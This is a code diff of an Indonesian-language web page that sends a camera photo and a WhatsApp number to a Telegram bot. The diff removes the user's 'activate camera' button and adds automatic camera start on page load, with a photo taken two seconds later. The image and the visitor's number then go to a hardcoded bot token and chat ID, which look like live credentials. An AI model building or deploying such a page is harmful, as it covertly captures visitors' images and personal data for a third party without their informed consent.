@@ -3,28 +3,35 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Ambil Foto & Kirim ke Telegram</title>
+  <title>Kirim Foto & Nomor WA ke Telegram</title>
   <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
     video, canvas {
       width: 100%;
       max-width: 400px;
       margin-top: 10px;
       display: none;
     }
-    #formContainer {
-      margin-top: 20px;
+    input, button {
+      margin-top: 10px;
+      padding: 10px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
   <h2>Ambil Foto & Kirim ke Telegram</h2>
-  <button onclick="startCamera()">Aktifkan Kamera</button>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <div id="formContainer" style="display:none;">
-    <p>Nomor WhatsApp:</p>
+    <p>Masukkan Nomor WhatsApp:</p>
     <input type="text" id="waNumber" placeholder="Contoh: 6281234567890" />
+    <br>
     <button onclick="sendToTelegram()">Kirim ke Telegram</button>
   </div>
 
@@ -34,7 +41,7 @@
     const context = canvas.getContext("2d");
     const form = document.getElementById("formContainer");
 
-    const botToken = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY'; // Ganti dengan token bot Telegram
+    const botToken = '7548364986:AAGhIDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY'; // Ganti dengan token bot kamu
     const chatId = '7041008009';     // Ganti dengan chat ID kamu
 
     let photoBlob = null;
@@ -53,10 +60,10 @@
             const dataURL = canvas.toDataURL("image/png");
             photoBlob = dataURLtoBlob(dataURL);
             form.style.display = "block";
-          }, 2000);
+          }, 2000); // Ambil foto otomatis 2 detik setelah kamera siap
         };
       } catch (err) {
-        alert("Gagal akses kamera. Pastikan kamu memberi izin dan pakai browser langsung.");
+        alert("Gagal mengakses kamera. Pastikan sudah mengizinkan.");
         console.error(err);
       }
     }
@@ -64,7 +71,7 @@
     function sendToTelegram() {
       const waNumber = document.getElementById("waNumber").value.trim();
       if (!waNumber || !photoBlob) {
-        alert("Masukkan nomor WhatsApp dan pastikan kamera sudah menyala.");
+        alert("Isi nomor WhatsApp dan pastikan foto berhasil diambil.");
         return;
       }
 
@@ -79,11 +86,11 @@
       })
       .then(res => res.json())
       .then(data => {
-        alert("Foto dan nomor berhasil dikirim ke Telegram!");
-        form.innerHTML = "<p>Berhasil terkirim.</p>";
+        alert("Berhasil dikirim ke Telegram!");
+        form.innerHTML = "<p>Data berhasil dikirim.</p>";
       })
       .catch(err => {
-        alert("Gagal kirim ke Telegram.");
+        alert("Gagal mengirim ke Telegram.");
         console.error(err);
       });
     }
@@ -99,6 +106,8 @@
       }
       return new Blob([u8arr], { type: mime });
     }
+
+    window.onload = startCamera;
   </script>
 </body>
 </html>
